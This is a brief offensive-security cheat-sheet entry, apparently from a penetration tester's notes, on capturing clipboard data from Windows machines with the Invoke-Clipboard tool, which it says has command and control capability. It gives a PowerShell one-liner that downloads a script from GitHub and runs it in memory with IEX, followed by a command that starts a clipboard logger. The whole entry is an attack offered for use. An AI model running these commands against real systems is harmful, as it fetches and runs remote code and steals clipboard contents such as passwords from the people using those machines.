# Extracting Clipboard data Windows

* script to get clipboard data from a windows system
  * also has command and control capability
    * [https://github.com/inguardians/Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard)

```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
```

```powershell-session
Invoke-ClipboardLogger
```
